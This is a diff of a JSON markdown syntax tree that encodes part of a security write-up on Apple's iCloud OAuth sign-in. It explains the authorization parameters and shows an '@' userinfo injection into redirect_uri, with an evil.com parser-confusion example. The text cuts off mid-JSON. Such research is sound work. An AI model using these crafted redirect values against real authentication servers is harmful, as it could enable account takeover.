>               "value": "Resource:  https://idmsa.apple.com/appleauth/auth/authorize/signin\nParameters:\n    client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\n\n    redirect_uri=https%3A%2F%2Fwww.icloud.com\n\n    response_mode=web_message\n\n    response_type=code\n\n    frame_id=72948678-5374-4a90-a176-31f75bb38405\n    \n    locale=en_GB",
>               "position": {
>                 "start": {
>                   "line": 293,
>                   "column": 1,
>                   "offset": 14358
>                 },
>                 "end": {
>                   "line": 307,
>                   "column": 4,
>                   "offset": 14712
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6320,6323c4914,5066
<             "end": {
<               "line": 362,
<               "column": 20,
<               "offset": 17607
---
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This looks a lot like a request with the OAuth authorization protocol. Probably\nbecause ",
>                   "position": {
>                     "start": {
>                       "line": 309,
>                       "column": 1,
>                       "offset": 14716
>                     },
>                     "end": {
>                       "line": 310,
>                       "column": 9,
>                       "offset": 14805
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 310,
>                       "column": 9,
>                       "offset": 14805
>                     },
>                     "end": {
>                       "line": 310,
>                       "column": 26,
>                       "offset": 14822
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " is the Apple ID server. OAuth is also perfect because\nOAuth generates tokens that are specific to each ",
>                   "position": {
>                     "start": {
>                       "line": 310,
>                       "column": 26,
>                       "offset": 14822
>                     },
>                     "end": {
>                       "line": 311,
>                       "column": 50,
>                       "offset": 14927
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "client_id",
>                   "position": {
>                     "start": {
>                       "line": 311,
>                       "column": 50,
>                       "offset": 14927
>                     },
>                     "end": {
>                       "line": 311,
>                       "column": 61,
>                       "offset": 14938
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", that is, the\ntokens correspond to the ",
>                   "position": {
>                     "start": {
>                       "line": 311,
>                       "column": 61,
>                       "offset": 14938
>                     },
>                     "end": {
>                       "line": 312,
>                       "column": 26,
>                       "offset": 14979
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "client_id",
>                   "position": {
>                     "start": {
>                       "line": 312,
>                       "column": 26,
>                       "offset": 14979
>                     },
>                     "end": {
>                       "line": 312,
>                       "column": 37,
>                       "offset": 14990
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", which represents the app requesting Apple\nID, in this case iCloud and they are not usually interchangable. I couldn't,\nthen, if this were implemented correctly take your iMessage authentication token\nand use it to get into your iCloud.",
>                   "position": {
>                     "start": {
>                       "line": 312,
>                       "column": 37,
>                       "offset": 14990
>                     },
>                     "end": {
>                       "line": 315,
>                       "column": 36,
>                       "offset": 15230
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 309,
>                   "column": 1,
>                   "offset": 14716
>                 },
>                 "end": {
>                   "line": 315,
>                   "column": 36,
>                   "offset": 15230
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
6325c5068,7526
<             "indent": []
---
>             {
>               "type": "list",
>               "ordered": false,
>               "start": null,
>               "spread": true,
>               "children": [
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "inlineCode",
>                           "value": "response_type=code",
>                           "position": {
>                             "start": {
>                               "line": 317,
>                               "column": 4,
>                               "offset": 15237
>                             },
>                             "end": {
>                               "line": 317,
>                               "column": 24,
>                               "offset": 15257
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " is an OAuth specific parameter asking for an OAuth code\nwhich the iCloud servers can exchange for an Apple ID credential.",
>                           "position": {
>                             "start": {
>                               "line": 317,
>                               "column": 24,
>                               "offset": 15257
>                             },
>                             "end": {
>                               "line": 318,
>                               "column": 66,
>                               "offset": 15380
>                             },
>                             "indent": [
>                               1
>                             ]
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 317,
>                           "column": 4,
>                           "offset": 15237
>                         },
>                         "end": {
>                           "line": 318,
>                           "column": 66,
>                           "offset": 15380
>                         },
>                         "indent": [
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 317,
>                       "column": 1,
>                       "offset": 15234
>                     },
>                     "end": {
>                       "line": 319,
>                       "column": 1,
>                       "offset": 15382
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "inlineCode",
>                           "value": "redirect_uri",
>                           "position": {
>                             "start": {
>                               "line": 320,
>                               "column": 4,
>                               "offset": 15387
>                             },
>                             "end": {
>                               "line": 320,
>                               "column": 18,
>                               "offset": 15401
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " is also an OAuth specific concept -- of where the token (in this\ncase the iCloud Apple ID authorization) goes to. But ",
>                           "position": {
>                             "start": {
>                               "line": 320,
>                               "column": 18,
>                               "offset": 15401
>                             },
>                             "end": {
>                               "line": 321,
>                               "column": 54,
>                               "offset": 15521
>                             },
>                             "indent": [
>                               1
>                             ]
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "redirect_uri",
>                           "position": {
>                             "start": {
>                               "line": 321,
>                               "column": 54,
>                               "offset": 15521
>                             },
>                             "end": {
>                               "line": 321,
>                               "column": 68,
>                               "offset": 15535
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " doesn't make\nsense in this concept because we're already on ",
>                           "position": {
>                             "start": {
>                               "line": 321,
>                               "column": 68,
>                               "offset": 15535
>                             },
>                             "end": {
>                               "line": 322,
>                               "column": 48,
>                               "offset": 15597
>                             },
>                             "indent": [
>                               1
>                             ]
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 322,
>                               "column": 48,
>                               "offset": 15597
>                             },
>                             "end": {
>                               "line": 322,
>                               "column": 60,
>                               "offset": 15609
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " so unless some weird\nstuff is going on I'm not expecting this frame to redirect to ",
>                           "position": {
>                             "start": {
>                               "line": 322,
>                               "column": 60,
>                               "offset": 15609
>                             },
>                             "end": {
>                               "line": 323,
>                               "column": 63,
>                               "offset": 15694
>                             },
>                             "indent": [
>                               1
>                             ]
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "icloud.com",
>                           "position": {
>                             "start": {
>                               "line": 323,
>                               "column": 63,
>                               "offset": 15694
>                             },
>                             "end": {
>                               "line": 323,
>                               "column": 75,
>                               "offset": 15706
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": ".",
>                           "position": {
>                             "start": {
>                               "line": 323,
>                               "column": 75,
>                               "offset": 15706
>                             },
>                             "end": {
>                               "line": 323,
>                               "column": 76,
>                               "offset": 15707
>                             },
>                             "indent": []
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 320,
>                           "column": 4,
>                           "offset": 15387
>                         },
>                         "end": {
>                           "line": 323,
>                           "column": 76,
>                           "offset": 15707
>                         },
>                         "indent": [
>                           1,
>                           1,
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 320,
>                       "column": 1,
>                       "offset": 15384
>                     },
>                     "end": {
>                       "line": 324,
>                       "column": 1,
>                       "offset": 15709
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "inlineCode",
>                           "value": "response_mode=web_message",
>                           "position": {
>                             "start": {
>                               "line": 325,
>                               "column": 4,
>                               "offset": 15714
>                             },
>                             "end": {
>                               "line": 325,
>                               "column": 31,
>                               "offset": 15741
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " appears to be the special indicator to the Apple ID\nserver that we don't want normal OAuth, we want an embedded page that passes us\nthe token eventually. 'web message' in this case likely refers to the\n",
>                           "position": {
>                             "start": {
>                               "line": 325,
>                               "column": 31,
>                               "offset": 15741
>                             },
>                             "end": {
>                               "line": 328,
>                               "column": 1,
>                               "offset": 15947
>                             },
>                             "indent": [
>                               1,
>                               1,
>                               1
>                             ]
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "postMessage",
>                           "position": {
>                             "start": {
>                               "line": 328,
>                               "column": 1,
>                               "offset": 15947
>                             },
>                             "end": {
>                               "line": 328,
>                               "column": 14,
>                               "offset": 15960
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " API which is used to securely communicate between embeds and other\nwebpages.",
>                           "position": {
>                             "start": {
>                               "line": 328,
>                               "column": 14,
>                               "offset": 15960
>                             },
>                             "end": {
>                               "line": 329,
>                               "column": 10,
>                               "offset": 16038
>                             },
>                             "indent": [
>                               1
>                             ]
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 325,
>                           "column": 4,
>                           "offset": 15714
>                         },
>                         "end": {
>                           "line": 329,
>                           "column": 10,
>                           "offset": 16038
>                         },
>                         "indent": [
>                           1,
>                           1,
>                           1,
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 325,
>                       "column": 1,
>                       "offset": 15711
>                     },
>                     "end": {
>                       "line": 330,
>                       "column": 1,
>                       "offset": 16040
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "listItem",
>                   "spread": false,
>                   "checked": null,
>                   "children": [
>                     {
>                       "type": "paragraph",
>                       "children": [
>                         {
>                           "type": "inlineCode",
>                           "value": "locale",
>                           "position": {
>                             "start": {
>                               "line": 331,
>                               "column": 4,
>                               "offset": 16045
>                             },
>                             "end": {
>                               "line": 331,
>                               "column": 12,
>                               "offset": 16053
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " just indicates the language to show the login dialog in. ",
>                           "position": {
>                             "start": {
>                               "line": 331,
>                               "column": 12,
>                               "offset": 16053
>                             },
>                             "end": {
>                               "line": 331,
>                               "column": 70,
>                               "offset": 16111
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "inlineCode",
>                           "value": "frame_id",
>                           "position": {
>                             "start": {
>                               "line": 331,
>                               "column": 70,
>                               "offset": 16111
>                             },
>                             "end": {
>                               "line": 331,
>                               "column": 80,
>                               "offset": 16121
>                             },
>                             "indent": []
>                           }
>                         },
>                         {
>                           "type": "text",
>                           "value": " I\nthink is just to help differentiate cases where there may be multiple different\nembedded pages.",
>                           "position": {
>                             "start": {
>                               "line": 331,
>                               "column": 80,
>                               "offset": 16121
>                             },
>                             "end": {
>                               "line": 333,
>                               "column": 16,
>                               "offset": 16221
>                             },
>                             "indent": [
>                               1,
>                               1
>                             ]
>                           }
>                         }
>                       ],
>                       "position": {
>                         "start": {
>                           "line": 331,
>                           "column": 4,
>                           "offset": 16045
>                         },
>                         "end": {
>                           "line": 333,
>                           "column": 16,
>                           "offset": 16221
>                         },
>                         "indent": [
>                           1,
>                           1
>                         ]
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 331,
>                       "column": 1,
>                       "offset": 16042
>                     },
>                     "end": {
>                       "line": 333,
>                       "column": 16,
>                       "offset": 16221
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 317,
>                   "column": 1,
>                   "offset": 15234
>                 },
>                 "end": {
>                   "line": 333,
>                   "column": 16,
>                   "offset": 16221
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Considering that this was a big factor in ",
>                   "position": {
>                     "start": {
>                       "line": 335,
>                       "column": 1,
>                       "offset": 16225
>                     },
>                     "end": {
>                       "line": 335,
>                       "column": 43,
>                       "offset": 16267
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "linkReference",
>                   "identifier": "how to hack the uk tax system",
>                   "label": "How to Hack the UK Tax System",
>                   "referenceType": "shortcut",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "How to Hack the UK Tax System",
>                       "position": {
>                         "start": {
>                           "line": 335,
>                           "column": 44,
>                           "offset": 16268
>                         },
>                         "end": {
>                           "line": 335,
>                           "column": 73,
>                           "offset": 16297
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 335,
>                       "column": 43,
>                       "offset": 16267
>                     },
>                     "end": {
>                       "line": 335,
>                       "column": 74,
>                       "offset": 16298
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", this\nmight make me awfully predictable but the first thing I tried was sneaking an ",
>                   "position": {
>                     "start": {
>                       "line": 335,
>                       "column": 74,
>                       "offset": 16298
>                     },
>                     "end": {
>                       "line": 336,
>                       "column": 79,
>                       "offset": 16384
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "@",
>                   "position": {
>                     "start": {
>                       "line": 336,
>                       "column": 79,
>                       "offset": 16384
>                     },
>                     "end": {
>                       "line": 336,
>                       "column": 82,
>                       "offset": 16387
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": "\ninto ",
>                   "position": {
>                     "start": {
>                       "line": 336,
>                       "column": 82,
>                       "offset": 16387
>                     },
>                     "end": {
>                       "line": 337,
>                       "column": 6,
>                       "offset": 16394
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri",
>                   "position": {
>                     "start": {
>                       "line": 337,
>                       "column": 6,
>                       "offset": 16394
>                     },
>                     "end": {
>                       "line": 337,
>                       "column": 20,
>                       "offset": 16408
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ":",
>                   "position": {
>                     "start": {
>                       "line": 337,
>                       "column": 20,
>                       "offset": 16408
>                     },
>                     "end": {
>                       "line": 337,
>                       "column": 21,
>                       "offset": 16409
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 335,
>                   "column": 1,
>                   "offset": 16225
>                 },
>                 "end": {
>                   "line": 337,
>                   "column": 21,
>                   "offset": 16409
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "definition",
>               "identifier": "how to hack the uk tax system",
>               "label": "How to hack the UK Tax System",
>               "title": null,
>               "url": "https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b",
>               "position": {
>                 "start": {
>                   "line": 339,
>                   "column": 1,
>                   "offset": 16413
>                 },
>                 "end": {
>                   "line": 339,
>                   "column": 110,
>                   "offset": 16522
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": null,
>               "meta": null,
>               "value": "redirect_uri=https%3A%2F%2Fthomas@www.icloud.com",
>               "position": {
>                 "start": {
>                   "line": 341,
>                   "column": 1,
>                   "offset": 16526
>                 },
>                 "end": {
>                   "line": 343,
>                   "column": 4,
>                   "offset": 16584
>                 },
>                 "indent": [
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "This is an old and extremely not supposed to be used syntax called 'HTTP Simple\nAuthentication URL Syntax'. The idea is that you could specify ",
>                   "position": {
>                     "start": {
>                       "line": 345,
>                       "column": 1,
>                       "offset": 16588
>                     },
>                     "end": {
>                       "line": 346,
>                       "column": 64,
>                       "offset": 16732
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "in",
>                       "position": {
>                         "start": {
>                           "line": 346,
>                           "column": 65,
>                           "offset": 16733
>                         },
>                         "end": {
>                           "line": 346,
>                           "column": 67,
>                           "offset": 16735
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 346,
>                       "column": 64,
>                       "offset": 16732
>                     },
>                     "end": {
>                       "line": 346,
>                       "column": 68,
>                       "offset": 16736
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " the url how\nyou wanted to login. For example, if I wanted to log into ",
>                   "position": {
>                     "start": {
>                       "line": 346,
>                       "column": 68,
>                       "offset": 16736
>                     },
>                     "end": {
>                       "line": 347,
>                       "column": 59,
>                       "offset": 16808
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "google.com",
>                   "position": {
>                     "start": {
>                       "line": 347,
>                       "column": 59,
>                       "offset": 16808
>                     },
>                     "end": {
>                       "line": 347,
>                       "column": 71,
>                       "offset": 16820
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " as my\naccount 'thomas', I'd open up in my browser ",
>                   "position": {
>                     "start": {
>                       "line": 347,
>                       "column": 71,
>                       "offset": 16820
>                     },
>                     "end": {
>                       "line": 348,
>                       "column": 45,
>                       "offset": 16872
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://thomas@google.com",
>                   "position": {
>                     "start": {
>                       "line": 348,
>                       "column": 45,
>                       "offset": 16872
>                     },
>                     "end": {
>                       "line": 348,
>                       "column": 72,
>                       "offset": 16899
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and the\nwebpage might ask for the password for my account ",
>                   "position": {
>                     "start": {
>                       "line": 348,
>                       "column": 72,
>                       "offset": 16899
>                     },
>                     "end": {
>                       "line": 349,
>                       "column": 51,
>                       "offset": 16959
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "thomas",
>                   "position": {
>                     "start": {
>                       "line": 349,
>                       "column": 51,
>                       "offset": 16959
>                     },
>                     "end": {
>                       "line": 349,
>                       "column": 59,
>                       "offset": 16967
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 349,
>                       "column": 59,
>                       "offset": 16967
>                     },
>                     "end": {
>                       "line": 349,
>                       "column": 60,
>                       "offset": 16968
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 345,
>                   "column": 1,
>                   "offset": 16588
>                 },
>                 "end": {
>                   "line": 349,
>                   "column": 60,
>                   "offset": 16968
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The 'great' thing about this syntax when it comes to hacking websites is that\nHTTP Simple Authentication URL syntax is ",
>                   "position": {
>                     "start": {
>                       "line": 351,
>                       "column": 1,
>                       "offset": 16972
>                     },
>                     "end": {
>                       "line": 352,
>                       "column": 42,
>                       "offset": 17092
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "not",
>                       "position": {
>                         "start": {
>                           "line": 352,
>                           "column": 43,
>                           "offset": 17093
>                         },
>                         "end": {
>                           "line": 352,
>                           "column": 46,
>                           "offset": 17096
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 352,
>                       "column": 42,
>                       "offset": 17092
>                     },
>                     "end": {
>                       "line": 352,
>                       "column": 47,
>                       "offset": 17097
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " part of the URL specification,\nmeaning that even the most advanced URL parser is not meant to understand it,\nand will give you wrong answers.",
>                   "position": {
>                     "start": {
>                       "line": 352,
>                       "column": 47,
>                       "offset": 17097
>                     },
>                     "end": {
>                       "line": 354,
>                       "column": 33,
>                       "offset": 17241
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 351,
>                   "column": 1,
>                   "offset": 16972
>                 },
>                 "end": {
>                   "line": 354,
>                   "column": 33,
>                   "offset": 17241
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "For example, if I give ",
>                   "position": {
>                     "start": {
>                       "line": 356,
>                       "column": 1,
>                       "offset": 17245
>                     },
>                     "end": {
>                       "line": 356,
>                       "column": 24,
>                       "offset": 17268
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://google.com@evil.com",
>                   "position": {
>                     "start": {
>                       "line": 356,
>                       "column": 24,
>                       "offset": 17268
>                     },
>                     "end": {
>                       "line": 356,
>                       "column": 53,
>                       "offset": 17297
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " to a normal URL parser, it\ndoesn't know what the ",
>                   "position": {
>                     "start": {
>                       "line": 356,
>                       "column": 53,
>                       "offset": 17297
>                     },
>                     "end": {
>                       "line": 357,
>                       "column": 23,
>                       "offset": 17348
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "@",
>                   "position": {
>                     "start": {
>                       "line": 357,
>                       "column": 23,
>                       "offset": 17348
>                     },
>                     "end": {
>                       "line": 357,
>                       "column": 26,
>                       "offset": 17351
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " means and might assume the URL goes a resource called\n",
>                   "position": {
>                     "start": {
>                       "line": 357,
>                       "column": 26,
>                       "offset": 17351
>                     },
>                     "end": {
>                       "line": 358,
>                       "column": 1,
>                       "offset": 17407
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "@evil.com",
>                   "position": {
>                     "start": {
>                       "line": 358,
>                       "column": 1,
>                       "offset": 17407
>                     },
>                     "end": {
>                       "line": 358,
>                       "column": 12,
>                       "offset": 17418
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " at ",
>                   "position": {
>                     "start": {
>                       "line": 358,
>                       "column": 12,
>                       "offset": 17418
>                     },
>                     "end": {
>                       "line": 358,
>                       "column": 16,
>                       "offset": 17422
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://google.com",
>                   "position": {
>                     "start": {
>                       "line": 358,
>                       "column": 16,
>                       "offset": 17422
>                     },
>                     "end": {
>                       "line": 358,
>                       "column": 36,
>                       "offset": 17442
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", when in fact if you give this to any modern\nbrowser it'll recognise the URL using its HTTP specific parser as going to\n",
>                   "position": {
>                     "start": {
>                       "line": 358,
>                       "column": 36,
>                       "offset": 17442
>                     },
>                     "end": {
>                       "line": 360,
>                       "column": 1,
>                       "offset": 17565
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://evil.com",
>                   "position": {
>                     "start": {
>                       "line": 360,
>                       "column": 1,
>                       "offset": 17565
>                     },
>                     "end": {
>                       "line": 360,
>                       "column": 19,
>                       "offset": 17583
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ".",
>                   "position": {
>                     "start": {
>                       "line": 360,
>                       "column": 19,
>                       "offset": 17583
>                     },
>                     "end": {
>                       "line": 360,
>                       "column": 20,
>                       "offset": 17584
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 356,
>                   "column": 1,
>                   "offset": 17245
>                 },
>                 "end": {
>                   "line": 360,
>                   "column": 20,
>                   "offset": 17584
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "In this case, when ",
>                   "position": {
>                     "start": {
>                       "line": 362,
>                       "column": 1,
>                       "offset": 17588
>                     },
>                     "end": {
>                       "line": 362,
>                       "column": 20,
>                       "offset": 17607
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "idmsa.apple.com",
>                   "position": {
>                     "start": {
>                       "line": 362,
>                       "column": 20,
>                       "offset": 17607
>                     },
>                     "end": {
>                       "line": 362,
>                       "column": 37,
>                       "offset": 17624
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " accepts\n",
>                   "position": {
>                     "start": {
>                       "line": 362,
>                       "column": 37,
>                       "offset": 17624
>                     },
>                     "end": {
>                       "line": 363,
>                       "column": 1,
>                       "offset": 17634
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "redirect_uri=https://thomas@www.icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 363,
>                       "column": 1,
>                       "offset": 17634
>                     },
>                     "end": {
>                       "line": 363,
>                       "column": 45,
>                       "offset": 17678
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": ", it's actually ",
>                   "position": {
>                     "start": {
>                       "line": 363,
>                       "column": 45,
>                       "offset": 17678
>                     },
>                     "end": {
>                       "line": 363,
>                       "column": 61,
>                       "offset": 17694
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "correct",
>                       "position": {
>                         "start": {
>                           "line": 363,
>                           "column": 62,
>                           "offset": 17695
>                         },
>                         "end": {
>                           "line": 363,
>                           "column": 69,
>                           "offset": 17702
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
>                   "position": {
>                     "start": {
>                       "line": 363,
>                       "column": 61,
>                       "offset": 17694
>                     },
>                     "end": {
>                       "line": 363,
>                       "column": 70,
>                       "offset": 17703
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " in\nthinking that this URL is actually just ",
>                   "position": {
>                     "start": {
>                       "line": 363,
>                       "column": 70,
>                       "offset": 17703
>                     },
>                     "end": {
>                       "line": 364,
>                       "column": 41,
>                       "offset": 17748
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://icloud.com",
>                   "position": {
>                     "start": {
>                       "line": 364,
>                       "column": 41,
>                       "offset": 17748
>                     },
>                     "end": {
>                       "line": 364,
>                       "column": 61,
>                       "offset": 17768
>                     },
>                     "indent": []
>                   }
>                 },
>                 {
>                   "type": "text",
>                   "value": " and letting the\nrequest through. But we've injected some extra characters in that might mess up\nsome other part of the system.",
>                   "position": {
>                     "start": {
>                       "line": 364,
>                       "column": 61,
>                       "offset": 17768
>                     },
>                     "end": {
>                       "line": 366,
>                       "column": 31,
>                       "offset": 17897
>                     },
>                     "indent": [
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 362,
>                   "column": 1,
>                   "offset": 17588
>                 },
>                 "end": {
>                   "line": 366,
>                   "column": 31,
>                   "offset": 17897
>                 },
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "OK, so, great, if I load\n",
>                   "position": {
>                     "start": {
>                       "line": 368,
>                       "column": 1,
>                       "offset": 17901
>                     },
>                     "end": {
>                       "line": 369,
>                       "column": 1,
>                       "offset": 17927
>                     },
>                     "indent": [
>                       1
>                     ]
>                   }
>                 },
>                 {
>                   "type": "inlineCode",
>                   "value": "https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fthomas@www.icloud.com&response_mode=web_message&response_type=code&frame_id=72948678-5374-4a90-a176-31f75bb38405&locale=en_GB",
>                   "position": {
>                     "start": {
>                       "line": 369,
>                       "column": 1,
>                       "offset": 17927
>                     },
>                     "end": {
